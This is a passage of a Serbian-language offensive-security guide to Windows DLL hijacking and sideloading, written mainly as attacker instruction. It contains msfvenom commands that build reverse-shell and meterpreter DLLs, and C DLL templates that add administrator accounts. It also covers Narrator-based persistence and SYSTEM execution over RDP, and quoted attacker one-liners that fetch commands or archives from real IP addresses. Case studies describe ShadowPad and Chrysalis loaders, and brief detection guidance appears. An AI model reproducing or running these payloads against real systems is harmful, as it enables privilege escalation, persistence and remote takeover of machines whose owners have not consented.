- Ako je DLL prepoznat kao **poznati DLL** za aktuelnu verziju Windows-a, sistem će koristiti svoju verziju poznatog DLL-a, zajedno sa svim njegovim zavisnim DLL-ovima, **preskačući pretragu**. Registarski ključ **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** sadrži listu ovih poznatih DLL-ova.
- Ako **DLL ima zavisnosti**, pretraga tih zavisnih DLL-ova obavlja se kao da su navedeni samo po **imenima modula**, bez obzira na to da li je početni DLL pronađen pomoću pune putanje.

### Eskalacija privilegija

**Uslovi**:

- Identifikujte proces koji radi ili će raditi sa **drugačijim privilegijama** (horizontalno ili lateralno kretanje), a kojem **nedostaje DLL**.
- Obezbedite **pristup za upis** u bilo koji **direktorijum** u kojem će se **DLL** tražiti. To može biti direktorijum izvršnog fajla ili direktorijum unutar sistemske putanje.

Ovi preduslovi nisu uobičajeni po podrazumevanim podešavanjima: privilegovanim izvršnim fajlovima obično ne nedostaju DLL zavisnosti, a standardni korisnici uglavnom ne mogu da upisuju u direktorijume sistemske putanje za pretragu. Pogrešno konfigurisana okruženja ipak mogu izložiti oba uslova.\
Ako su uslovi ispunjeni, pogledajte projekat [UACME](https://github.com/hfiref0x/UACME). Iako mu je glavni cilj UAC bypass, sadrži PoC primere za DLL hijacking za određene verzije Windows-a koji se često mogu prilagoditi direktorijumu sa pravom upisa koji ste pronašli.

Imajte na umu da možete **proveriti svoje dozvole u fascikli** pomoću:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

I **proverite dozvole za sve fascikle unutar PATH-a**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Možete proveriti i uvoze izvršne datoteke i izvoze DLL-a pomoću:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Za kompletan vodič o tome kako da **zloupotrebite DLL Hijacking za eskalaciju privilegija** pomoću dozvola za pisanje u fasciklu **System Path**, pogledajte:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automatizovani alati

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) će proveriti da li imate dozvole za pisanje u bilo kojoj fascikli unutar system PATH-a.\
Ostali zanimljivi automatizovani alati za otkrivanje ove ranjivosti su **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ i _Write-HijackDll._

### Primer

Ako pronađete scenario koji se može iskoristiti, jedna od najvažnijih stvari za uspešno iskorišćavanje jeste da **napravite DLL koji exportuje barem sve funkcije koje će izvršna datoteka uvesti iz njega**. Ipak, imajte na umu da je DLL Hijacking koristan za [eskalaciju sa nivoa Medium Integrity na High **(zaobilaženjem UAC-a)**](../../authentication-credentials-uac-and-efs/index.html#uac) ili sa[ **High Integrity na SYSTEM**](../index.html#from-high-integrity-to-system)**.** Primer **kako da napravite ispravan DLL** možete pronaći u ovoj studiji o DLL hijacking-u, usmerenoj na izvršavanje putem DLL hijacking-a: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Pored toga, u **sledećem odeljku** možete pronaći neke **osnovne primere koda za DLL** koji mogu poslužiti kao **šabloni** ili za pravljenje **DLL-a sa exportovanim funkcijama koje nisu neophodne**.

## **Kreiranje i kompajliranje DLL-ova**

### **DLL Proxifying**

U suštini, **DLL proxy** je DLL koji može da **izvrši vaš zlonamerni kod kada se učita**, ali i da **izlaže** i **radi** kako se **očekuje**, tako što **prosleđuje sve pozive pravoj biblioteci**.

Pomoću alata [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ili [**Spartacus**](https://github.com/Accenture/Spartacus) možete da **navedete izvršnu datoteku i izaberete biblioteku** koju želite da proxify-ujete, pa da **generišete proxified DLL**, ili da **navedete DLL** i **generišete proxified DLL**.

### **Meterpreter**

**Get rev shell (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Nabavite meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Kreirajte korisnika (x86, nisam video x64 verziju):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Sopstveni

U mnogim slučajevima, DLL koji kompajlirate mora da **eksportuje svaku funkciju koju uvozi victim proces**. Ako nedostaje neki neophodan export, binarni fajl ne može da ga razreši i exploit ne uspeva.

<details>
<summary>C šablon za DLL (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>C++ DLL primer sa kreiranjem korisnika</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>Alternativni C DLL sa ulaznom tačkom niti</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

### NativeAOT DLL sa inicijalizacijom pokrenutom izvozom

Samostalna **.NET NativeAOT deljena biblioteka** može da se koristi kao postavljeni native DLL bez implementacije eksplicitnog `DllMain`. Izvezite statičke C# metode pomoću `[UnmanagedCallersOnly(EntryPoint = "...")]`; kada native host pozove jednu od ovih ulaznih tačaka koje generiše kompajler, NativeAOT inicijalizuje modul, a metoda `[ModuleInitializer]` se izvršava pre tela izvezene C# metode. Za ovaj izlaz nije potrebno posebno instalirati .NET runtime.<sup>[[26]](#references)[[27]](#references)[[28]](#references)[[29]](#references)</sup>

DLL-u su i dalje potrebni **nazivi izvoza i potpisi kompatibilni sa ABI-jem** koje izabrani host zaista poziva. Minimalni stubovi mogu biti dovoljni da pokrenu inicijalizaciju, ali nedostajući izvozi mogu da spreče učitavanje, a neispravan potpis može da ošteti poziv. Ispitajte importe hosta i proverite rezultat pomoću `dumpbin /exports payload.dll` pre nego što preimenujete izlaznu datoteku u naziv zavisnosti koji host očekuje.<sup>[[26]](#references)[[28]](#references)</sup>

<details>
<summary>Minimalni izvezeni NativeAOT DLL</summary>

```csharp
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

internal static class Bootstrap
{
    [ModuleInitializer]
    internal static void Start()
    {
        File.WriteAllText(Path.Combine(Path.GetTempPath(), "nativeaot-sideload.txt"),
                          Environment.ProcessPath ?? "loaded");
    }
}

public static class Exports
{
    [UnmanagedCallersOnly(EntryPoint = "LoadLibraryShim")]
    public static nint LoadLibraryShim() => 0;
}
```

</details>

Konfigurišite projekat kao samostalnu nativnu deljenu biblioteku za Windows:<sup>[[26]](#references)[[27]](#references)</sup>

```xml
<PropertyGroup>
  <TargetFramework>net7.0</TargetFramework>
  <PublishAot>true</PublishAot>
  <NativeLib>Shared</NativeLib>
  <SelfContained>true</SelfContained>
  <RuntimeIdentifier>win-x64</RuntimeIdentifier>
</PropertyGroup>
```

```powershell
dotnet publish .\SideloadPoc.csproj -c Release -r win-x64
dumpbin /exports .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll
Copy-Item .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll .\<expected-name>.dll
```

Postavite preimenovani DLL pored kopirane ranjive izvršne datoteke i pokrenite host kroz putanju koda koja poziva kompatibilni export. Ovaj pristup s inicijalizatorom izbegava smeštanje složene logike direktno u `DllMain`, ali preduslovi za sideloading ostaju isti: loader mora da razreši zavisnost po imenu, izabere direktorijum aplikacije i da je prethodno ne pronađe preko KnownDLLs, već učitanog modula, SxS redirekcije ili ograničenih zastavica `LOAD_LIBRARY_SEARCH_*`.<sup>[[26]](#references)[[30]](#references)</sup>

Za uobičajene native predloške pogledajte [Windows C payloads](../windows-c-payloads.md). Prva faza učitana putem sideloading-a može naknadno da izvrši [process hollowing](../../../reversing/common-api-used-in-malware.md#process-hollowing-aka-runpe), ali to je zasebna tehnika ubacivanja, a ne deo razrešavanja DLL-a.

## Detekcija: učitavanja biblioteka pomoću DLL masquerading-a

Elastic Defend 9.5.0 obogaćuje događaj učitavanja biblioteke vrednošću `dll.Ext.defense_evasions: "DLL Hijack: Masquerading"` kada učitana datoteka nije potpisana od strane Microsofta, a njen naziv se poklapa sa nazivom iz keširanog inventara Windows/sistemskih DLL-ova u Elastic-u. Time se analiza inventara naziva datoteka, sistemskih lokacija i potpisa premešta u senzor krajnje tačke; osnovni EQL zato može da se svede na:<sup>[[26]](#references)</sup>

```text
library where host.os.type == "windows" and event.action == "load" and
  dll.Ext.defense_evasions : "DLL Hijack: Masquerading"
```

Tretirajte obogaćivanje kao vredan pivot, a ne kao dokaz samo po sebi. Povećajte nivo pouzdanosti kada potpisani host učitava DLL iz sopstvenog **direktorijuma u koji korisnik može da upisuje**, DLL nije potpisan ili mu se ne veruje, a `dll.Ext.relative_file_creation_time` pokazuje da je kreiran neposredno pre učitavanja. Izuzimanja ograničite na tačnu kombinaciju izdavača, host procesa i putanje instalacije; nemojte globalno potiskivati podudaranje naziva DLL-a jer legitimni instaleri i aplikacije mogu da isporučuju privatne biblioteke sa nazivima sličnim sistemskim.<sup>[[26]](#references)</sup>

Na senzorima bez tog obogaćivanja, ponašanje približno odredite korelacijom podudarnog naziva DLL-a sa putanjom učitavanja koja nije sistemska, odsustvom Microsoft potpisa ili nepouzdanim Microsoft potpisom i kratkim intervalom između kreiranja fajla i učitavanja. Za to je potreban ažuriran inventar naziva DLL-ova i uska izuzimanja za `%SystemRoot%\\System32`, `SysWOW64`, `WinSxS` i druge odobrene putanje za isporuku.<sup>[[26]](#references)</sup>

## Studija slučaja: DLL Hijack lokalizacione DLL biblioteke Narrator OneCore TTS (pristupačnost/ATs)

Windows Narrator.exe i dalje pri pokretanju proverava predvidljivu lokalizacionu DLL biblioteku specifičnu za jezik, koju je moguće hijackovati radi proizvoljnog izvršavanja koda i održavanja prisustva.<sup>[[7]](#references)</sup>

Ključne činjenice
- Putanja provere (aktuelne verzije): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Nasleđena putanja (starije verzije): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Ako na putanji OneCore postoji DLL kojim upravlja napadač i u koji može da upisuje, on se učitava i izvršava se `DllMain(DLL_PROCESS_ATTACH)`. Nisu potrebni izvozi.

Pronalaženje pomoću Procmon-a
- Filter: `Process Name is Narrator.exe` i `Operation is Load Image` ili `CreateFile`.
- Pokrenite Narrator i posmatrajte pokušaj učitavanja navedene putanje.

Minimalni DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

OPSEC tišina
- Naivni hijack će aktivirati glasovni izlaz/istaknuti UI. Da biste ostali neprimetni, pri priključivanju izlistajte Narrator niti, otvorite glavnu nit (`OpenThread(THREAD_SUSPEND_RESUME)`) i suspendujte je pomoću `SuspendThread`; nastavite u svojoj niti. Pogledajte PoC za kompletan kod.<sup>[[8]](#references)</sup>

Pokretanje i postojanost putem Accessibility konfiguracije
- Kontekst korisnika (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Uz navedeno, pokretanje Narrator-a učitava podmetnuti DLL. Na bezbednoj radnoj površini (ekranu za prijavljivanje) pritisnite CTRL+WIN+ENTER da biste pokrenuli Narrator; vaš DLL se izvršava kao SYSTEM na bezbednoj radnoj površini.

Izvršavanje SYSTEM procesa pokrenuto putem RDP-a (lateralno kretanje)
- Dozvolite klasični RDP bezbednosni sloj: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Povežite se sa hostom putem RDP-a, a na ekranu za prijavljivanje pritisnite CTRL+WIN+ENTER da biste pokrenuli Narrator; vaš DLL se izvršava kao SYSTEM na bezbednoj radnoj površini.
- Izvršavanje se zaustavlja kada se RDP sesija zatvori — odmah izvršite inject/migrate.

Bring Your Own Accessibility (BYOA)
- Možete klonirati ugrađeni unos registra Accessibility Tool (AT) (npr. CursorIndicator), izmeniti ga tako da pokazuje na proizvoljni binarni fajl/DLL, uvesti ga, a zatim postaviti `configuration` na ime tog AT-a. Time se proizvoljno izvršavanje posreduje kroz Accessibility framework.

Napomene
- Upisivanje u `%windir%\System32` i menjanje HKLM vrednosti zahtevaju administratorska prava.
- Celokupna logika payload-a može da se nalazi u `DLL_PROCESS_ATTACH`; izvozi nisu potrebni.

## Studija slučaja: CVE-2025-1729 - Eskalacija privilegija pomoću TPQMAssistant.exe

Ovaj slučaj prikazuje **Phantom DLL Hijacking** u Lenovo TrackPoint Quick Menu-u (`TPQMAssistant.exe`), evidentiran kao **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Detalji ranjivosti

- **Komponenta**: `TPQMAssistant.exe`, smešten u `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Planirani zadatak**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` pokreće se svakog dana u 9:30 u kontekstu prijavljenog korisnika.
- **Dozvole direktorijuma**: Omogućeno je pisanje za `CREATOR OWNER`, pa lokalni korisnici mogu da smeste proizvoljne fajlove.
- **Ponašanje DLL pretrage**: Prvo pokušava da učita `hostfxr.dll` iz svog radnog direktorijuma i beleži „NAME NOT FOUND“ ako fajl nedostaje, što ukazuje na prioritet pretrage u lokalnom direktorijumu.

### Implementacija exploita

Napadač može da smesti zlonamerni `hostfxr.dll` stub u isti direktorijum i iskoristi nedostajući DLL za izvršavanje koda u kontekstu korisnika:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Tok napada

1. Kao standardni korisnik, postavite `hostfxr.dll` u `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Sačekajte da se zakazani zadatak pokrene u 9:30 u kontekstu trenutnog korisnika.
3. Ako je administrator prijavljen kada se zadatak izvrši, zlonamerni DLL se pokreće u administratorskoj sesiji sa srednjim nivoom integriteta.
4. Povežite standardne UAC bypass tehnike da biste podigli privilegije sa srednjeg nivoa integriteta na SYSTEM.

## Studija slučaja: MSI CustomAction dropper + DLL side-loading preko potpisanog host procesa (wsc_proxy.exe)

Akteri pretnji često kombinuju dropper-e zasnovane na MSI-ju sa DLL side-loading-om kako bi izvršili payload-e u okviru pouzdanog, potpisanog procesa.<sup>[[10]](#references)</sup>

Pregled lanca
- Korisnik preuzima MSI. CustomAction se neprimetno pokreće tokom GUI instalacije (npr. LaunchApplication ili VBScript akcija) i rekonstruiše sledeću fazu iz ugrađenih resursa.
- Dropper upisuje legitimni, potpisani EXE i zlonamerni DLL u isti direktorijum (primer para: wsc_proxy.exe potpisan od strane Avast-a + wsc.dll pod kontrolom napadača).
- Kada se pokrene potpisani EXE, Windows redosledom pretrage DLL-ova prvo učitava wsc.dll iz radnog direktorijuma, izvršavajući kod napadača u okviru potpisanog roditeljskog procesa (ATT&CK T1574.001).

Analiza MSI-ja (šta tražiti)
- Tabela CustomAction:
  - Potražite stavke koje pokreću izvršne datoteke ili VBScript. Primer sumnjivog obrasca: LaunchApplication pokreće ugrađenu datoteku u pozadini.
  - U Orca (Microsoft Orca.exe) pregledajte tabele CustomAction, InstallExecuteSequence i Binary.
- Ugrađeni/rascepkani payload-i u MSI CAB-u:
  - Administrativno izdvajanje: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Ili koristite lessmsi: lessmsi x package.msi C:\out
  - Potražite više malih fragmenata koje VBScript CustomAction spaja i dešifruje. Uobičajen tok:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Praktično sideloading pomoću wsc_proxy.exe
- Smestite ove dve datoteke u isti folder:
  - wsc_proxy.exe: legitimni potpisani host (Avast). Proces pokušava da učita wsc.dll po imenu iz svog direktorijuma.
  - wsc.dll: DLL napadača. Ako nisu potrebni posebni exports, DllMain može biti dovoljan; u suprotnom, napravite proxy DLL i prosledite potrebne exports pravoj biblioteci, dok payload pokrećete u DllMain.
- Napravite minimalni DLL payload:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Za zahteve za eksportima koristite proxying framework (npr. DLLirant/Spartacus) da biste generisali forwarding DLL koji takođe izvršava vaš payload.

- Ova tehnika se oslanja na razrešavanje imena DLL-a od strane host binarnog fajla. Ako host koristi apsolutne putanje ili bezbedne zastavice za učitavanje (npr. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack možda neće uspeti.
- KnownDLLs, SxS i prosleđeni eksporti mogu uticati na prioritet, pa ih treba uzeti u obzir pri izboru host binarnog fajla i skupa eksportova.

## Potpisani trojci + šifrovani payload-i (studija slučaja ShadowPad)

Check Point je opisao kako Ink Dragon postavlja ShadowPad pomoću **trojca od tri fajla** koji se stapa s legitimnim softverom, dok osnovni payload ostaje šifrovan na disku:<sup>[[12]](#references)</sup>

1. **Potpisani host EXE** – zloupotrebljavaju se proizvođači kao što su AMD, Realtek ili NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Napadači preimenuju izvršnu datoteku tako da liči na Windows binarnu datoteku (na primer, `conhost.exe`), ali Authenticode potpis ostaje važeći.
2. **Zlonamerni loader DLL** – postavlja se pored EXE-a pod očekivanim imenom (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL je obično MFC binarna datoteka obfuskirana pomoću ScatterBrain framework-a; njen jedini zadatak je da pronađe šifrovani blob, dešifruje ga i reflektivno mapira ShadowPad.
3. **Šifrovani payload blob** – često se čuva kao `<name>.tmp` u istom direktorijumu. Nakon mapiranja dešifrovanog payload-a u memoriju, loader briše TMP fajl kako bi uništio forenzičke dokaze.

Napomene o tradecraft-u:

* Preimenovanje potpisanog EXE-a (uz zadržavanje originalnog `OriginalFileName` u PE zaglavlju) omogućava mu da se predstavlja kao Windows binarna datoteka, a da pritom zadrži potpis proizvođača. Zato oponašajte naviku Ink Dragon-a da postavlja binarne datoteke koje izgledaju kao `conhost.exe`, a zapravo su AMD/NVIDIA alati.
* Pošto izvršna datoteka ostaje pouzdana, većina kontrola allowlisting-a zahteva samo da vaš zlonamerni DLL bude smešten pored nje. Usredsredite se na prilagođavanje loader DLL-a; potpisani nadređeni fajl obično može da se pokrene bez izmena.
* ShadowPad-ov decryptor očekuje da se TMP blob nalazi pored loader-a i da može da se menja kako bi obrisao fajl nakon mapiranja. Ostavite direktorijum upisivim dok se payload ne učita; kada se nađe u memoriji, TMP fajl može bezbedno da se obriše radi OPSEC-a.

### LOLBAS stager + lanac sideloading-a iz staged arhive (finger → tar/curl → WMI)

Operateri kombinuju DLL sideloading sa LOLBAS-om, tako da je jedini prilagođeni artefakt na disku zlonamerni DLL pored pouzdanog EXE-a:<sup>[[1]](#references)</sup>

- **Učitavač udaljenih komandi (Finger):** skriveni PowerShell pokreće `cmd.exe /c`, preuzima komande sa Finger servera i prosleđuje ih komandi `cmd`:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` preuzima tekst preko TCP/79; `| cmd` izvršava odgovor servera, što operatorima omogućava da rotiraju second stage na strani servera.

- **Ugrađeno preuzimanje/raspakivanje:** Preuzmite arhivu sa bezazlenom ekstenzijom, raspakujte je i smestite cilj za sideload i DLL u nasumično izabrani folder `%LocalAppData%`:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` skriva napredak i prati preusmeravanja; `tar -xf` koristi Windows-ov ugrađeni tar.

- **WMI/CIM pokretanje:** Pokrenite EXE preko WMI-ja, tako da telemetrija prikazuje proces koji je kreirao CIM dok učitava DLL koji se nalazi pored njega:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Radi sa binarnim fajlovima koji daju prednost lokalnim DLL-ovima (npr. `intelbq.exe`, `nearby_share.exe`); payload (npr. Remcos) pokreće se pod pouzdanim imenom.

- **Lov:** Upozorite na `forfiles` kada se `/p`, `/m` i `/c` pojavljuju zajedno; ta kombinacija je neuobičajena van administratorskih skripti.


## Studija slučaja: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Nedavna intruzija Lotus Blossom zloupotrebila je pouzdan lanac ažuriranja za isporuku droppera upakovanog pomoću NSIS-a, koji je pripremio DLL sideload i payload-ove koji se u potpunosti izvršavaju u memoriji.<sup>[[13]](#references)</sup>

Tok aktivnosti
- `update.exe` (NSIS) kreira `%AppData%\Bluetooth`, označava ga kao **HIDDEN**, ubacuje preimenovani Bitdefender Submission Wizard `BluetoothService.exe`, zlonamerni `log.dll` i šifrovani blob `BluetoothService`, a zatim pokreće EXE.
- Host EXE uvozi `log.dll` i poziva `LogInit`/`LogWrite`. `LogInit` učitava blob pomoću mmap-a; `LogWrite` ga dešifruje prilagođenim tokom zasnovanim na LCG-u (konstante **0x19660D** / **0x3C6EF35F**, ključni materijal izveden iz prethodnog hash-a), prepisuje bafer običnim shellcode-om, oslobađa privremene podatke i prepušta mu izvršavanje.
- Da bi izbegao IAT, loader razrešava API-je tako što hashira izvozna imena koristeći **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, a zatim primenjuje Murmur-stil avalanche (**0x85EBCA6B**) i poredi rezultat sa hash vrednostima ciljeva sa dodatom salt vrednošću.

Glavni shellcode (Chrysalis)
- Dešifruje glavni modul nalik PE-u ponavljanjem operacija sabiranja/XOR-a/oduzimanja sa ključem `gQ2JR&9;` kroz pet prolaza, a zatim dinamički učitava `Kernel32.dll` → `GetProcAddress` da bi dovršio razrešavanje importa.
- Rekonstruiše nizove imena DLL-ova tokom izvršavanja pomoću transformacija rotacije bitova/XOR-a za svaki znak, a zatim učitava `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Koristi drugi resolver koji prolazi kroz **PEB → InMemoryOrderModuleList**, parsira svaku izvoznu tabelu u blokovima od 4 bajta uz Murmur-stil mešanja i koristi `GetProcAddress` kao rezervnu opciju samo ako hash nije pronađen.

Ugrađena konfiguracija i C2
- Konfiguracija se nalazi u odbačenoj datoteci `BluetoothService` na **offset-u 0x30808** (veličina **0x980**) i dešifruje se pomoću RC4 ključa `qwhvb^435h&*7`, čime se otkrivaju C2 URL i User-Agent.
- Beacon-i formiraju host profil razdvojen tačkama, dodaju prefiks `4Q`, a zatim ga šifruju pomoću RC4 ključa `vAuig34%^325hGV` pre slanja preko HTTPS-a pomoću `HttpSendRequestA`. Odgovori se dešifruju pomoću RC4-a i obrađuju na osnovu taga (`4T` shell, `4V` izvršavanje procesa, `4W/4X` upisivanje datoteke, `4Y` čitanje/eksfiltracija, `4\\` deinstalacija, `4` enumeracija diskova/datoteka + slučajevi prenosa u delovima).
- Režim izvršavanja zavisi od CLI argumenata: bez argumenata = instalira postojanost (service/Run ključ) koji upućuje na `-i`; `-i` ponovo pokreće sam sebe sa `-k`; `-k` preskače instalaciju i pokreće payload.

Uočeni alternativni loader
- U istoj intruziji ubačen je Tiny C Compiler, a pokrenut je `svchost.exe -nostdlib -run conf.c` iz `C:\ProgramData\USOShared\`, uz `libtcc.dll` u istom direktorijumu. C izvorni kod koji je dostavio napadač sadržao je shellcode, koji je kompajliran i pokrenut u memoriji bez zapisivanja PE-a na disk. Ponovite postupak pomoću:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Ova faza kompajliranja i pokretanja zasnovana na TCC-u uvezla je `Wininet.dll` tokom izvršavanja i preuzela shellcode druge faze sa hardkodiranog URL-a, čime je obezbedila fleksibilan loader koji se predstavlja kao pokretanje kompajlera.

## Sideloading potpisanog hosta uz proxyovanje exporta + parkiranje niti hosta

Neki lanci DLL sideloadinga dodaju **inženjering stabilnosti** kako bi legitimni host ostao aktivan dovoljno dugo da kasnije faze budu ispravno učitane, umesto da se sruši nakon učitavanja zlonamernog DLL-a.<sup>[[11]](#references)</sup>

Uočeni obrazac
- Postavite pouzdani EXE pored zlonamernog DLL-a, koristeći očekivani naziv zavisnosti kao što je `version.dll`.
- Zlonamerni DLL **proxyuje svaki očekivani export** ka pravom sistemskom DLL-u (na primer `%SystemRoot%\\System32\\version.dll`), tako da razrešavanje uvoza i dalje uspeva, a host proces nastavlja da radi.
- Nakon učitavanja, zlonamerni DLL **patchuje ulaznu tačku hosta** tako da glavna nit upadne u beskonačnu `Sleep` petlju, umesto da se završi ili pokrene putanje koda koje bi okončale proces.
- Nova nit obavlja stvarni zlonamerni posao: dešifruje naziv ili putanju DLL-a naredne faze (RC4/XOR su uobičajeni), a zatim ga pokreće pomoću `LoadLibrary`.

Zašto je ovo važno
- Uobičajeno proxyovanje DLL-a čuva kompatibilnost API-ja, ali ne garantuje da će host ostati aktivan dovoljno dugo za kasnije faze.
- Parkiranje glavne niti u `Sleep(INFINITE)` jednostavan je način da potpisani proces ostane aktivan dok loader obavlja dešifrovanje, pripremu ili pokretanje mrežne komunikacije u radnoj niti.
- Traženje samo sumnjivog `DllMain`-a može da propusti ovaj obrazac ako se zanimljivo ponašanje odvija nakon patchovanja ulazne tačke hosta i pokretanja sekundarne niti.

Minimalni tok rada
1. Kopirajte potpisani host EXE i utvrdite koji DLL učitava iz lokalnog direktorijuma.
2. Napravite proxy DLL koji eksportuje iste funkcije i prosleđuje ih legitimnom DLL-u.
3. U `DllMain(DLL_PROCESS_ATTACH)` kreirajte radnu nit.
4. Iz te niti patchujte ulaznu tačku hosta ili rutinu pokretanja glavne niti tako da se vrti u petlji koja poziva `Sleep`.
5. Dešifrujte naziv/konfiguraciju DLL-a naredne faze i pozovite `LoadLibrary` ili ručno mapirajte payload.

Odbrambene tačke za proveru
- Potpisani procesi koji učitavaju `version.dll` ili slične uobičajene biblioteke iz sopstvenog direktorijuma aplikacije umesto iz `System32`.
- Memorijske izmene na ulaznoj tački procesa ubrzo nakon učitavanja slike, naročito skokovi/pozivi preusmereni na `Sleep`/`SleepEx`.
- Niti koje kreira proxy DLL, a koje odmah pozivaju `LoadLibrary` za drugi DLL sa dešifrovanim nazivom.
- Proxy DLL-ovi sa svim exportima, smešteni pored izvršnih datoteka dobavljača u direktorijumima za pripremu koji omogućavaju upis, kao što su `ProgramData`, `%TEMP%` ili putanje do raspakovanih arhiva.

## References

